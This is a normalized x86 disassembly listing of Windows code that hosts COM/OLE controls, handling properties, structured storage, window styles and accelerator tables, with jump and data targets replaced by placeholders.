lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x7c ] 0x40
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
call sub_426793
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] ebx
mov edi [ eax + 0x1c ]
mov [ ebp - 0x68 ] ebx
mov ebx r--data
add ebx 0x8
cmp ebx r--data
jb r-xdata
mov eax [ ebx ]
or [ ebp - 0x68 ] eax
mov eax [ edi ]
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx edi
push [ ebx - 0x4 ]
push esi
call [ eax + 0x94 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x24 ]
push ecx
push 0xfffffd40
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd43
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd34
push esi
mov ecx edi
call [ eax + 0x94 ]
movsx eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd3f
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x50 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd41
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x5c ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
pop edi
jge r-xdata
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x3c ]
push edx
lea edx [ ebp - 0x7c ]
mov [ ebp - 0x3c ] 0x18
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0xc ]
test eax eax
jl r-xdata
and [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x14 ] 0x1
mov [ esi + 0x70 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0x60 ] eax
mov eax [ ebp - 0x2c ]
mov [ esi + 0x64 ] eax
lea eax [ ebp - 0x24 ]
push eax
call [ VariantClear@IAT ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4281a0
mov eax sub_46461c
call sub_42dc88
sub esp 0x64
push ebx
push esi
push edi
mov esi ecx
push [ ebp + 0x14 ]
xor ebx ebx
lea edi [ esi + 0x4c ]
mov [ ebp - 0x24 ] esi
push edi
push r--data
push 0x3
push ebx
push [ ebp + 0x8 ]
call sub_427f72
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
lea eax [ esi + 0x3c ]
mov ecx esi
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
call sub_428615
mov eax [ esi ]
mov ecx esi
call [ eax + 0xbc ]
cmp eax ebx
mov [ ebp - 0x20 ] eax
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ edi ]
lea ecx [ esi + 0x70 ]
push ecx
push 0x1
mov edx [ eax ]
push eax
call [ edx + 0x58 ]
test [ esi + 0x72 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ edi ]
add esi 0xb8
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
mov eax [ edi ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ edi ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ edi ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jge r-xdata
cmp esi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push ebx
push ebx
push ebx
push 0x3
mov ecx esi
call [ eax + 0x50 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push 0x1
push eax
call [ ecx + 0x18 ]
mov eax [ edi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ edi ] ebx
cmp [ ebp + 0x10 ] ebx
je r-xdata
lea eax [ ebp + 0xc ]
mov [ ebp + 0xc ] ebx
push eax
push 0x1
push ebx
call [ CreateILockBytesOnHGlobal@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
push ebx
push 0x1000
push 0x1
push esi
lea ecx [ ebp - 0x70 ]
call sub_447b03
lea eax [ ebp - 0x70 ]
lea ecx [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_43c446
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x2c ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x70 ]
mov [ ebp + 0x14 ] eax
call sub_447bdf
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ esi ]
lea ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp + 0x10 ]
push ecx
push 0xffffffff
push ebx
mov ecx esi
mov [ ebp + 0x10 ] ebx
call [ eax + 0x50 ]
mov ecx [ ebp + 0x8 ]
push eax
push [ ebp + 0x10 ]
mov edx [ ecx ]
push ecx
call [ edx + 0x14 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ ebp + 0x14 ] 0x8000ffff
mov eax [ esi ]
mov ecx esi
call [ eax + 0x30 ]
push eax
push ebx
mov [ ebp + 0xc ] eax
call [ GlobalAlloc@IAT ]
cmp eax ebx
mov [ ebp + 0x10 ] eax
je r-xdata
mov eax [ ebp - 0x14 ]
lea eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
push eax
push ebx
push 0x1012
push [ ebp + 0xc ]
call [ StgCreateDocfileOnILockBytes@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jl r-xdata
mov eax [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jl r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x8007000e
mov [ ebp + 0x10 ] ebx
push eax
call [ GlobalLock@IAT ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
push [ ebp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ ebp + 0x14 ] 0x1
mov ecx [ ebp - 0x24 ]
test [ ecx + 0x72 ] 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push [ ebp + 0x10 ]
call [ CreateILockBytesOnHGlobal@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
push [ ebp + 0xc ]
mov edx [ esi ]
mov ecx esi
push eax
call [ edx + 0x34 ]
push [ ebp + 0x10 ]
call [ GlobalUnlock@IAT ]
jmp r-xdata
mov eax [ edi ]
add ecx 0xb8
push ecx
push eax
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp + 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x18 ] ebx
push eax
push ebx
push ebx
push 0x12
push ebx
push [ ebp - 0x1c ]
call [ StgOpenStorageOnILockBytes@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
cmp [ ebp + 0x10 ] ebx
mov [ ebp - 0x1c ] ebx
je r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
sub_4284aa
push esi
lea esi [ ecx + 0x2c ]
mov eax [ ecx + 0x4c ]
push esi
mov esi [ ecx + 0x1c ]
add ecx 0xb8
mov edx [ eax ]
mov esi [ esi + 0x1c ]
push [ esi + 0x1c ]
push 0x0
push ecx
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push eax
call [ edx + 0x2c ]
pop esi
retn 0x8
sub_4284ff
push ebp
mov ebp esp
test [ ecx + 0x71 ] 0x10
je r-xdata
pop ebp
retn 0x4
mov eax [ ecx + 0x6c ]
mov edx eax
and edx 0x1
cmp edx [ ebp + 0x8 ]
je r-xdata
and [ ebp + 0x8 ] 0x0
xor eax 0x1
mov [ ecx + 0x6c ] eax
mov ecx [ ecx + 0x4c ]
lea edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push r--data
push ecx
call [ eax ]
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
push 0xfffffd37
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_42854f
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0xc ]
push edx
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
leave
retn 0x8
sub_4285b7
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
leave
retn 0x8
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_428615
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi r--data
mov ebx ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x4c ]
xor edi edi
lea edx [ ebp - 0xc ]
mov [ ebp - 0xc ] edi
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
push 0x10
push r--data
push [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edi
call sub_42dcf0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push 0x1
push eax
call [ ecx + 0x10 ]
mov eax [ ebp - 0xc ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
push 0x10
push r--data
push [ ebp + 0x8 ]
call sub_42dcf0
add esp 0xc
neg eax
sbb eax eax
pop edi
pop esi
pop ebx
neg eax
leave
retn 0x4
mov ebx [ ebx + 0x4c ]
lea ecx [ ebp - 0x14 ]
push ecx
push r--data
mov eax [ ebx ]
push ebx
call [ eax ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0xc ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0x30 ] di
jbe r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp - 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x1c ]
push edx
push esi
mov ecx [ eax ]
push eax
call [ ecx + 0x24 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
inc esi
movzx eax [ eax + 0x30 ]
cmp esi eax
jb r-xdata
mov eax [ ebp - 0x1c ]
and eax 0x7
cmp al 0x3
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] edi
push edx
mov ecx [ eax ]
push esi
push eax
call [ ecx + 0x20 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
push [ ebp - 0x20 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x38 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov esi [ ebp - 0x18 ]
mov edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
push [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
sub_42878f
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x10
push 0x0
lea esi [ edi + 0x74 ]
push esi
call sub_42dc30
mov edi [ edi + 0x4c ]
and [ ebp - 0x4 ] 0x0
add esp 0xc
lea ecx [ ebp - 0x4 ]
mov [ esi ] 0x10
mov eax [ edi ]
push ecx
push r--data
push edi
call [ eax ]
test eax eax
jl r-xdata
pop edi
pop esi
leave
retn
mov eax [ ebp - 0x4 ]
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4287dd
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
mov ax [ esi + 0x7c ]
cmp ax bx
je r-xdata
xor eax eax
cmp [ esi + 0x78 ] ebx
je r-xdata
movzx eax ax
push edi
lea eax [ eax + eax * 2 ]
shl eax 0x1
push eax
call sub_441e89
mov edi eax
pop ecx
movzx eax [ esi + 0x7c ]
push eax
push edi
push [ esi + 0x78 ]
call [ CopyAcceleratorTableA@IAT ]
cmp eax ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
jle r-xdata
push edi
call sub_441eb2
mov eax [ ebp - 0x8 ]
pop ecx
pop edi
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov ecx edi
mov esi [ edx + 0x4 ]
pop esi
pop ebx
leave
retn 0x4
and [ ebp + 0x8 ] 0x0
mov [ ebp + 0x8 ] 0x10
jmp r-xdata
inc [ ebp - 0x4 ]
add ecx 0x6
cmp [ ebp - 0x4 ] eax
jl r-xdata
mov bx [ ecx + 0x2 ]
cmp bx [ edx + 0x8 ]
je r-xdata
movzx ebx [ ecx ]
and ebx 0xfffffffd
cmp ebx [ ebp + 0x8 ]
jne r-xdata
cmp esi 0x106
jne r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
sub_428880
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
test [ esi + 0x71 ] 0x40
jne r-xdata
mov eax [ esi + 0x4c ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
pop esi
jl r-xdata
mov eax [ esi ]
call [ eax + 0xac ]
leave
retn 0x4
mov eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4288c8
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4c ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
leave
retn 0x4
mov eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4288fe
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi ecx
lea edx [ ebp - 0x4 ]
push edx
mov eax [ esi + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
test eax eax
jl r-xdata
pop esi
leave
retn
mov eax [ ebp - 0x4 ]
cmp [ esi + 0x20 ] eax
je r-xdata
mov ecx [ esi + 0x24 ]
mov [ esi + 0x20 ] eax
test ecx ecx
je r-xdata
push eax
call sub_43e7f8
mov eax [ esi + 0x24 ]
mov [ eax + 0x38 ] esi
sub_42893b
push esi
mov esi ecx
mov ecx [ esi + 0x24 ]
and [ esi + 0x20 ] 0x0
test ecx ecx
je r-xdata
pop esi
retn
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
and [ eax + 0x38 ] 0x0
mov eax [ ecx ]
push edi
call [ eax + 0x80 ]
mov edi eax
mov eax [ esi + 0x24 ]
push [ eax + 0x1c ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
call sub_43e831
pop edi
cmp [ edi ] 0x0
je r-xdata
mov ecx [ esi + 0x24 ]
call sub_441537
sub_428989
push esi
mov esi ecx
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x1c ]
push 0x0
push [ esp + 0xc ]
mov ecx [ eax + 0x1c ]
push 0xfffffffe
mov eax [ ecx ]
push [ esi + 0x28 ]
call [ eax + 0xc ]
mov eax [ ecx ]
push 0x0
push [ esp + 0xc ]
push 0xfffffffe
push [ esi + 0x28 ]
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
retn 0x4
sub_4289c6
push ebp
mov ebp esp
push ecx
cmp [ ecx + 0x58 ] 0x0
push esi
lea esi [ ecx + 0x58 ]
jne r-xdata
push [ ebp + 0x1c ]
mov ecx esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_457a56
mov ecx [ ecx + 0x4c ]
test ecx ecx
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ ecx ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
push ecx
call [ eax ]
test eax eax
jl r-xdata
pop esi
leave
retn 0x18
push 0x1
mov ecx esi
push [ ebp - 0x4 ]
call sub_457a23
sub_428a1c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test ah 0x40
je r-xdata
push 0x8
pop edx
cmp ax dx
jne r-xdata
and eax 0xbfff
or al 0x40
test ah 0x80
je r-xdata
push 0xe
pop eax
xor edx edx
cmp ax 0x9
setne dl
dec edx
and edx 0x4
add edx 0x4
and eax 0x7fff
jmp r-xdata
push esi
push edi
push [ ebp + 0x10 ]
mov esi [ ecx ]
mov [ ebp + 0xe ] al
lea edi [ ebp + 0xe ]
xor eax eax
push edi
push eax
push eax
push edx
mov [ ebp + 0xf ] al
push [ ebp + 0x8 ]
call [ esi + 0x58 ]
pop edi
pop esi
pop ebp
retn 0xc
sub_428a77
push ebp
mov ebp esp
lea edx [ ebp + 0x20 ]
mov ecx [ ebp + 0x8 ]
push edx
push [ ebp + 0x1c ]
mov eax [ ecx ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x58 ]
pop ebp
retn
sub_428aca
mov eax sub_464628
call sub_42dc88
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov eax [ ecx ]
lea edx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] esp
and [ ebp - 0x4 ] 0x0
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x5c ]
mov [ ebp + 0x10 ] 0x1
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_428b1d
mov eax sub_464634
call sub_42dc88
sub esp 0x14
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push 0xfffffff0
push [ esi + 0x20 ]
mov [ ebp - 0x1c ] esi
call [ GetWindowLongA@IAT ]
and [ ebp - 0x4 ] 0x0
mov edi eax
mov eax [ esi ]
and edi 0x10000000
or edi [ esi + 0x6c ]
lea ecx [ ebp - 0x18 ]
push ecx
push 0xb
push 0xfffffdfe
mov ecx esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] 0x1
call [ eax + 0x64 ]
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov edx [ esi ]
and [ ebp - 0x18 ] 0x0
push 0x2
lea ecx [ ebp - 0x18 ]
pop eax
push ecx
push eax
push 0xfffffe08
mov ecx esi
mov [ ebp - 0x4 ] eax
call [ edx + 0x64 ]
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
or edi 0x8000000
mov [ ebp - 0x14 ] edi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x12 ] 0x80
sub_428b8a
mov esi [ ebp - 0x1c ]
mov edx [ esi ]
and [ ebp - 0x18 ] 0x0
push 0x2
lea ecx [ ebp - 0x18 ]
pop eax
push ecx
push eax
push 0xfffffe08
mov ecx esi
mov [ ebp - 0x4 ] eax
call [ edx + 0x64 ]
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x12 ] 0x80
sub_428bd3
mov eax sub_464640
call sub_42dc88
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push 0xffffffec
push [ esi + 0x20 ]
call [ GetWindowLongA@IAT ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
push ecx
push 0x2
push 0xfffffdf8
mov ecx esi
call [ eax + 0x64 ]
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x13 ] 0x2
sub_428c3b
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov eax ebx
mov esi ecx
push edi
mov edi [ esp + 0x14 ]
not eax
and eax [ esi + 0x6c ]
or eax edi
and eax [ esi + 0x68 ]
mov [ esi + 0x6c ] eax
mov eax 0x8000000
test eax ebx
jne r-xdata
mov ecx [ esi ]
mov edx edi
not edx
and edx eax
push edx
push 0xb
push 0xfffffdfe
push esi
call [ ecx + 0x6c ]
add esp 0x10
test eax eax
je r-xdata
test eax edi
je r-xdata
mov eax 0x800000
test eax ebx
jne r-xdata
mov eax 0xf7ffffff
and ebx eax
and edi eax
mov ecx [ esi ]
mov edx edi
and edx eax
push edx
push 0x2
push 0xfffffe08
push esi
call [ ecx + 0x6c ]
add esp 0x10
test eax eax
je r-xdata
test eax edi
je r-xdata
push [ esp + 0x18 ]
push edi
push ebx
push [ esi + 0x20 ]
call sub_43e441
pop edi
pop esi
pop ebx
retn 0xc
mov eax 0xff7fffff
and ebx eax
and edi eax
sub_428ccb
push ebp
mov ebp esp
mov eax 0x200
push esi
test [ ebp + 0x8 ] eax
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
jne r-xdata
mov ecx [ esi ]
mov edx edi
and edx eax
push edx
push 0x2
push 0xfffffdf8
push esi
call [ ecx + 0x6c ]
add esp 0x10
test eax eax
je r-xdata
test eax edi
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
push [ esi + 0x20 ]
call sub_43e45b
pop edi
pop esi
pop ebp
retn 0xc
mov eax 0xfffffdff
and [ ebp + 0x8 ] eax
and edi eax
sub_428d1b
push esi
mov esi ecx
push [ esp + 0x8 ]
mov eax [ esi ]
push 0x8
push 0xfffffdfa
push esi
call [ eax + 0x6c ]
add esp 0x10
test eax eax
jne r-xdata
pop esi
retn 0x4
push [ esp + 0x8 ]
mov eax [ esi ]
push 0x8
push 0xfffffdfb
push esi
call [ eax + 0x6c ]
add esp 0x10
sub_428d4e
mov eax sub_46464c
call sub_42dc88
sub esp 0xc
push ebx
mov eax [ ecx ]
push esi
push edi
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
push 0x8
push 0xfffffdfa
call [ eax + 0x64 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_428dbd
mov eax sub_464660
call sub_42dc88
push ecx
mov eax [ rw-data ]
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
push edx
call [ eax + 0x88 ]
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_428e18
mov eax sub_464674
call sub_42dc88
push ecx
mov eax [ rw-data ]
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
push edx
call [ eax + 0x88 ]
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi [ eax - 0x8 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_428e6e
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
lea ebx [ ecx + 0x2c ]
push edi
mov esi ebx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ecx
movsd [ edi ] [ esi ]
mov ecx [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
mov edi [ ebp + 0xc ]
mov esi [ SetRect@IAT ]
add eax edi
push eax
mov eax [ ebp + 0x8 ]
add ecx eax
push ecx
push edi
push eax
push ebx
call esi
mov ecx [ ebp - 0x4 ]
call sub_427bfe
test eax eax
je r-xdata
lea esi [ ebp - 0x14 ]
mov edi ebx
movsd [ edi ] [ esi ]
